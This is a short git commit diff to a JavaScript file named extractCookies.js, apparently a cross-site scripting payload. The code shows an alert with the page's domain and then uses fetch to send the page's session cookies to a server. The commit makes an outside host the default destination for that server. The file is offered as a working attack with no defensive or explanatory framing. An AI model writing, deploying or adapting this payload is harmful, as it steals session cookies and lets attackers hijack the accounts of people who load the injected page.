1e3bfaca81fc427d5d01ac0114985d83ee11e50a
g6g <gaetan.guibaud@gmail.com>
2026-07-03 12:26:49 +0200

    improve with vps

--- extractCookies.js
+++ extractCookies.js
@@ -1,13 +1,10 @@
-function alertAndExtractSessionCookie(key){
+function main(){
+
     alert(document.domain)
-    let serverOut = urlParams.get("serverOut");
+    let serverOut = urlParams.get("serverOut")?? "//o.g6g.fr";
     if (!!serverOut){
         fetch(`${serverOut}?session=${encodeURIComponent(document.cookies)}`);
     }
-}
-
-function main(){
-    alertAndExtractSessionCookie(pathKey);
 }
 
 main();
